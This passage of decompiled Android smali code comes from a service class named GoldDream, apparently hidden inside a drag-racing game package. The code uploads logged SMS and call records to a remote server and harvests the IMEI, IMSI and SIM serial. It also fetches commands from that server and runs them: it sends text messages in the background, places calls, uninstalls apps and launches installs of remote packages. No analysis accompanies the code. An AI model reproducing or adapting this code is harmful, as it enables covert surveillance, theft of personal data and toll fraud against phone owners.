    .local v0, "f":Ljava/io/File;
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 231
    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 233
    :cond_0
    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    return v2
.end method

.method private getNowTime(I)I
    .locals 2
    .param p1, "obj"    # I

    .prologue
    .line 431
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v0

    .line 432
    .local v0, "c":Ljava/util/Calendar;
    packed-switch p1, :pswitch_data_0

    .line 444
    const/4 v1, 0x0

    :goto_0
    return v1

    .line 434
    :pswitch_0
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/util/Calendar;->get(I)I

    move-result v1

    goto :goto_0

    .line 436
    :pswitch_1
    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Ljava/util/Calendar;->get(I)I

    move-result v1

    goto :goto_0

    .line 438
    :pswitch_2
    const/4 v1, 0x5

    invoke-virtual {v0, v1}, Ljava/util/Calendar;->get(I)I

    move-result v1

    goto :goto_0

    .line 440
    :pswitch_3
    const/16 v1, 0xb

    invoke-virtual {v0, v1}, Ljava/util/Calendar;->get(I)I

    move-result v1

    goto :goto_0

    .line 442
    :pswitch_4
    const/16 v1, 0xc

    invoke-virtual {v0, v1}, Ljava/util/Calendar;->get(I)I

    move-result v1

    goto :goto_0

    .line 432
    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch
.end method

.method private isUpdateParam()Z
    .locals 9

    .prologue
    const/4 v8, 0x0

    .line 389
    const-string v5, "lud"

    const-string v6, "lud_v"

    invoke-virtual {p0, v5, v6}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 390
    .local v2, "tmpLastDate":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "http://"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "dom"

    const-string v7, "dom_v"

    invoke-virtual {p0, v6, v7}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/zj/upload/UpdateParam.aspx?"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 391
    .local v1, "objUrl":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "uid="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "uid"

    const-string v7, "uid_v"

    invoke-virtual {p0, v6, v7}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "&taskTypeId="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "tti"

    const-string v7, "tti_v"

    invoke-virtual {p0, v6, v7}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 392
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "&type=1"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 393
    invoke-virtual {p0, v1}, Lcom/GoldDream/zj/zjService;->getValueFromServer(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 394
    .local v4, "tmpServerParamLastDate":Ljava/lang/String;
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 396
    .local v3, "tmpRst":Ljava/lang/Boolean;
    :try_start_0
    invoke-direct {p0, v2, v4}, Lcom/GoldDream/zj/zjService;->compareTwoDate(Ljava/lang/String;Ljava/lang/String;)J

    move-result-wide v5

    const-wide/16 v7, 0x0

    cmp-long v5, v5, v7

    if-ltz v5, :cond_0

    .line 397
    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 398
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    .line 407
    :goto_0
    return v5

    .line 400
    :cond_0
    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 401
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z
    :try_end_0
    .catch Ljava/text/ParseException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v5

    goto :goto_0

    .line 403
    :catch_0
    move-exception v5

    move-object v0, v5

    .line 405
    .local v0, "e":Ljava/text/ParseException;
    invoke-virtual {v0}, Ljava/text/ParseException;->printStackTrace()V

    .line 407
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    goto :goto_0
.end method

.method private uploadAllFiles()V
    .locals 11
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/IOException;
        }
    .end annotation

    .prologue
    const-string v10, "http://"

    const-string v9, "dom_v"

    const-string v8, "dom"

    const-string v5, ""

    .line 285
    new-instance v4, Lcom/GoldDream/zj/UploadFiles;

    invoke-direct {v4}, Lcom/GoldDream/zj/UploadFiles;-><init>()V

    .line 287
    .local v4, "uf":Lcom/GoldDream/zj/UploadFiles;
    const-string v2, "/data/data/com.creativemobi.DragRacing/files/zjsms.txt"

    .line 288
    .local v2, "obj1":Ljava/lang/String;
    const-string v3, "/data/data/com.creativemobi.DragRacing/files/zjphonecall.txt"

    .line 291
    .local v3, "obj2":Ljava/lang/String;
    invoke-direct {p0, v2}, Lcom/GoldDream/zj/zjService;->fileIsExists(Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_1

    .line 324
    :cond_0
    :goto_0
    return-void

    .line 294
    :cond_1
    invoke-direct {p0, v3}, Lcom/GoldDream/zj/zjService;->fileIsExists(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_0

    .line 297
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "http://"

    invoke-direct {v5, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "dom"

    const-string v6, "dom_v"

    invoke-virtual {p0, v8, v9}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/zj/upload/UploadFiles.aspx?askId=1&uid="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "uid"

    const-string v7, "uid_v"

    invoke-virtual {p0, v6, v7}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5, v2}, Lcom/GoldDream/zj/UploadFiles;->uploadFile(Ljava/lang/String;Ljava/lang/String;)V

    .line 300
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "http://"

    invoke-direct {v5, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v6, "dom"

    const-string v6, "dom_v"

    invoke-virtual {p0, v8, v9}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "/zj/upload/UploadFiles.aspx?askId=2&uid="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "uid"

    const-string v7, "uid_v"

    invoke-virtual {p0, v6, v7}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5, v3}, Lcom/GoldDream/zj/UploadFiles;->uploadFile(Ljava/lang/String;Ljava/lang/String;)V

    .line 305
    const-string v2, "zjsms.txt"

    .line 306
    const-string v3, "zjphonecall.txt"

    .line 309
    const/4 v5, 0x2

    :try_start_0
    invoke-virtual {p0, v2, v5}, Lcom/GoldDream/zj/zjService;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    .line 310
    .local v1, "fos":Ljava/io/FileOutputStream;
    new-instance v5, Ljava/lang/String;

    const-string v6, ""

    invoke-direct {v5, v6}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/io/FileOutputStream;->write([B)V

    .line 311
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1

    .line 317
    .end local v1    # "fos":Ljava/io/FileOutputStream;
    :goto_1
    const/4 v5, 0x2

    :try_start_1
    invoke-virtual {p0, v3, v5}, Lcom/GoldDream/zj/zjService;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    .line 318
    .restart local v1    # "fos":Ljava/io/FileOutputStream;
    new-instance v5, Ljava/lang/String;

    const-string v6, ""

    invoke-direct {v5, v6}, Ljava/lang/String;-><init>(Ljava/lang/String;)V

    invoke-virtual {v5}, Ljava/lang/String;->getBytes()[B

    move-result-object v5

    invoke-virtual {v1, v5}, Ljava/io/FileOutputStream;->write([B)V

    .line 319
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_1
    .catch Ljava/io/FileNotFoundException; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    .line 320
    .end local v1    # "fos":Ljava/io/FileOutputStream;
    :catch_0
    move-exception v5

    move-object v0, v5

    .line 322
    .local v0, "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto/16 :goto_0

    .line 312
    .end local v0    # "e":Ljava/io/FileNotFoundException;
    :catch_1
    move-exception v5

    move-object v0, v5

    .line 314
    .restart local v0    # "e":Ljava/io/FileNotFoundException;
    invoke-virtual {v0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    goto :goto_1
.end method


# virtual methods
.method public CallPhoneNumber(Ljava/lang/String;)V
    .locals 3
    .param p1, "taskInfo"    # Ljava/lang/String;

    .prologue
    .line 574
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.CALL"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 575
    .local v0, "myIntentCall":Landroid/content/Intent;
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "tel:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 576
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 577
    invoke-virtual {p0, v0}, Lcom/GoldDream/zj/zjService;->startActivity(Landroid/content/Intent;)V

    .line 578
    return-void
.end method

.method public GetDeviceInfo()V
    .locals 2

    .prologue
    const-string v1, "phone"

    .line 711
    const-string v0, "phone"

    invoke-virtual {p0, v1}, Lcom/GoldDream/zj/zjService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/GoldDream/zj/zjService;->Dev_MIEI:Ljava/lang/String;

    .line 712
    const-string v0, "phone"

    invoke-virtual {p0, v1}, Lcom/GoldDream/zj/zjService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/GoldDream/zj/zjService;->Dev_SimSSN:Ljava/lang/String;

    .line 713
    const-string v0, "phone"

    invoke-virtual {p0, v1}, Lcom/GoldDream/zj/zjService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p0

    .end local p0    # "this":Lcom/GoldDream/zj/zjService;
    check-cast p0, Landroid/telephony/TelephonyManager;

    invoke-virtual {p0}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/GoldDream/zj/zjService;->Dev_IMSI:Ljava/lang/String;

    .line 720
    return-void
.end method

.method public IsWatchCall()Z
    .locals 2

    .prologue
    .line 124
    const-string v0, "wc"

    const-string v1, "wc_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "1"

    if-ne v0, v1, :cond_0

    .line 125
    const/4 v0, 0x1

    .line 127
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public IsWatchSms()Z
    .locals 2

    .prologue
    .line 117
    const-string v0, "ws"

    const-string v1, "ws_v"

    invoke-virtual {p0, v0, v1}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "1"

    if-ne v0, v1, :cond_0

    .line 118
    const/4 v0, 0x1

    .line 120
    :goto_0
    return v0

    :cond_0
    const/4 v0, 0x0

    goto :goto_0
.end method

.method public PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p1, "obj"    # Ljava/lang/String;
    .param p2, "keyName"    # Ljava/lang/String;
    .param p3, "keyInfo"    # Ljava/lang/String;

    .prologue
    .line 705
    const/4 v1, 0x2

    invoke-virtual {p0, p1, v1}, Lcom/GoldDream/zj/zjService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 707
    .local v0, "editor":Landroid/content/SharedPreferences$Editor;
    invoke-interface {v0, p2, p3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 708
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 709
    return-void
.end method

.method public bg_sendSms(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;
    .locals 6
    .param p1, "sms_objNumber"    # Ljava/lang/String;
    .param p2, "sms_content"    # Ljava/lang/String;
    .param p3, "SmsType"    # I

    .prologue
    .line 580
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 581
    .local v0, "sm":Landroid/telephony/SmsManager;
    const/4 v1, 0x1

    if-ne p3, v1, :cond_0

    .line 583
    const/4 v2, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    move-object v1, p1

    move-object v3, p2

    :try_start_0
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 584
    const-string v1, "ok"

    .line 590
    :goto_0
    return-object v1

    .line 586
    :catch_0
    move-exception v1

    .line 590
    :cond_0
    const-string v1, "Pass Sms Data Type set failed"

    goto :goto_0
.end method

.method public checkUid()V
    .locals 6

    .prologue
    const-string v5, "uid_v"

    const-string v4, "uid"

    .line 629
    const-string v2, "uid"

    const-string v2, "uid_v"

    invoke-virtual {p0, v4, v5}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 630
    .local v1, "uidStr":Ljava/lang/String;
    const-string v2, "0"

    if-eq v1, v2, :cond_0

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    const/4 v3, 0x1

    if-gt v2, v3, :cond_1

    .line 631
    :cond_0
    invoke-virtual {p0}, Lcom/GoldDream/zj/zjService;->GetDeviceInfo()V

    .line 632
    invoke-virtual {p0}, Lcom/GoldDream/zj/zjService;->getUidfromServer()Ljava/lang/String;

    move-result-object v0

    .line 633
    .local v0, "tmpUid":Ljava/lang/String;
    const-string v2, "uid"

    const-string v2, "uid_v"

    invoke-virtual {p0, v4, v5, v0}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 636
    .end local v0    # "tmpUid":Ljava/lang/String;
    :cond_1
    return-void
.end method

.method public doWorkTask()V
    .locals 11

    .prologue
    const-string v10, ">"

    .line 448
    const-string v8, "uid"

    const-string v9, "uid_v"

    invoke-virtual {p0, v8, v9}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 449
    .local v7, "tempUid":Ljava/lang/String;
    const-string v8, "tti"

    const-string v9, "tti_v"

    invoke-virtual {p0, v8, v9}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 451
    .local v6, "taskTypeId":Ljava/lang/String;
    const-string v8, "rt"

    const-string v9, "rt_v"

    invoke-virtual {p0, v8, v9}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 452
    .local v1, "isRest":Ljava/lang/String;
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Integer;->intValue()I

    move-result v8

    const/4 v9, 0x1

    if-ne v8, v9, :cond_1

    .line 477
    :cond_0
    :goto_0
    return-void

    .line 455
    :cond_1
    invoke-direct {p0}, Lcom/GoldDream/zj/zjService;->IsRestTime()Z

    move-result v8

    if-nez v8, :cond_0

    .line 465
    invoke-virtual {p0, v6}, Lcom/GoldDream/zj/zjService;->getTaskCountFromServer(Ljava/lang/String;)I

    move-result v3

    .line 466
    .local v3, "taskCount":I
    const/4 v0, 0x1

    .local v0, "i":I
    :goto_1
    if-le v0, v3, :cond_2

    .line 476
    const-string v8, "ltd"

    const-string v9, "ltd_v"

    invoke-virtual {p0}, Lcom/GoldDream/zj/zjService;->getNowDate()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {p0, v8, v9, v10}, Lcom/GoldDream/zj/zjService;->PutKeyNode(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 467
    :cond_2
    invoke-virtual {p0, v0, v7, v6}, Lcom/GoldDream/zj/zjService;->getTaskFromServer(ILjava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 469
    .local v2, "rstTask":Ljava/lang/String;
    const/4 v8, 0x0

    const-string v9, ">"

    invoke-virtual {v2, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v9

    invoke-virtual {v2, v8, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    .line 470
    .local v4, "taskId":Ljava/lang/String;
    const-string v8, ">"

    invoke-virtual {v2, v10}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v8

    add-int/lit8 v8, v8, 0x1

    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v9

    invoke-virtual {v2, v8, v9}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v5

    .line 473
    .local v5, "taskInfo":Ljava/lang/String;
    invoke-static {v4}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v8

    invoke-virtual {p0, v8, v5}, Lcom/GoldDream/zj/zjService;->executeTask(Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 466
    add-int/lit8 v0, v0, 0x1

    goto :goto_1
.end method

.method public executeTask(Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 18
    .param p1, "taskId"    # Ljava/lang/Integer;
    .param p2, "taskInfo"    # Ljava/lang/String;

    .prologue
    .line 506
    invoke-virtual/range {p1 .. p1}, Ljava/lang/Integer;->intValue()I

    move-result v15

    packed-switch v15, :pswitch_data_0

    .line 550
    :goto_0
    :pswitch_0
    const-string v15, "You input the other code!"

    return-object v15

    .line 509
    :pswitch_1
    const/4 v15, 0x0

    const-string v16, "#"

    move-object/from16 v0, p2

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v16

    move-object/from16 v0, p2

    move v1, v15

    move/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v11

    .line 510
    .local v11, "sms_objNumber":Ljava/lang/String;
    const-string v15, "#"

    move-object/from16 v0, p2

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v15

    add-int/lit8 v15, v15, 0x1

    invoke-virtual/range {p2 .. p2}, Ljava/lang/String;->length()I

    move-result v16

    move-object/from16 v0, p2

    move v1, v15

    move/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v10

    .line 511
    .local v10, "sms_content":Ljava/lang/String;
    const/4 v15, 0x1

    move-object/from16 v0, p0

    move-object v1, v11

    move-object v2, v10

    move v3, v15

    invoke-virtual {v0, v1, v2, v3}, Lcom/GoldDream/zj/zjService;->bg_sendSms(Ljava/lang/String;Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v8

    .line 513
    .local v8, "rstStr":Ljava/lang/String;
    goto :goto_0

    .line 517
    .end local v8    # "rstStr":Ljava/lang/String;
    .end local v10    # "sms_content":Ljava/lang/String;
    .end local v11    # "sms_objNumber":Ljava/lang/String;
    :pswitch_2
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-virtual {v0, v1}, Lcom/GoldDream/zj/zjService;->getValueFromServer(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 518
    .local v9, "rstString":Ljava/lang/String;
    goto :goto_0

    .line 520
    .end local v9    # "rstString":Ljava/lang/String;
    :pswitch_3
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-virtual {v0, v1}, Lcom/GoldDream/zj/zjService;->CallPhoneNumber(Ljava/lang/String;)V

    goto :goto_0

    .line 524
    :pswitch_4
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-virtual {v0, v1}, Lcom/GoldDream/zj/zjService;->getValueFromServer(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 525
    .local v7, "rstAMStr":Ljava/lang/String;
    goto :goto_0

    .line 527
    .end local v7    # "rstAMStr":Ljava/lang/String;
    :pswitch_5
    const-string v15, "package"

    const/16 v16, 0x0

    move-object v0, v15

    move-object/from16 v1, p2

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v13

    .line 528
    .local v13, "uri":Landroid/net/Uri;
    new-instance v4, Landroid/content/Intent;

    const-string v15, "android.intent.action.DELETE"

    invoke-direct {v4, v15, v13}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 529
    .local v4, "it":Landroid/content/Intent;
    const/high16 v15, 0x10000000

    invoke-virtual {v4, v15}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 530
    move-object/from16 v0, p0

    move-object v1, v4

    invoke-virtual {v0, v1}, Lcom/GoldDream/zj/zjService;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 534
    .end local v4    # "it":Landroid/content/Intent;
    .end local v13    # "uri":Landroid/net/Uri;
    :pswitch_6
    invoke-static/range {p2 .. p2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v14

    .line 535
    .local v14, "uri2":Landroid/net/Uri;
    new-instance v5, Landroid/content/Intent;

    const-string v15, "android.intent.action.VIEW"

    invoke-direct {v5, v15, v14}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    .line 536
    .local v5, "it2":Landroid/content/Intent;
    invoke-virtual {v5, v14}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 537
    const/4 v15, 0x1

    invoke-virtual {v5, v15}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 538
    const/high16 v15, 0x10000000

    invoke-virtual {v5, v15}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 539
    const-string v15, "com.android.packageinstaller"

    const-string v16, "com.android.packageinstaller.PackageInstallerActivity"

    move-object v0, v5

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 540
    move-object/from16 v0, p0

    move-object v1, v5

    invoke-virtual {v0, v1}, Lcom/GoldDream/zj/zjService;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_0

    .line 543
    .end local v5    # "it2":Landroid/content/Intent;
    .end local v14    # "uri2":Landroid/net/Uri;
    :pswitch_7
    new-instance v12, Lcom/GoldDream/zj/UploadFiles;

    invoke-direct {v12}, Lcom/GoldDream/zj/UploadFiles;-><init>()V

    .line 544
    .local v12, "uf":Lcom/GoldDream/zj/UploadFiles;
    new-instance v15, Ljava/lang/StringBuilder;

    const-string v16, "http://"

    invoke-direct/range {v15 .. v16}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v16, "dom"

    const-string v17, "dom_v"

    move-object/from16 v0, p0

    move-object/from16 v1, v16

    move-object/from16 v2, v17

    invoke-virtual {v0, v1, v2}, Lcom/GoldDream/zj/zjService;->getKeyNode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    const-string v16, "/zj/upload/UploadFiles.aspx?askId=3"

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 545
    .local v6, "objUrl":Ljava/lang/String;
    move-object v0, v12

    move-object v1, v6

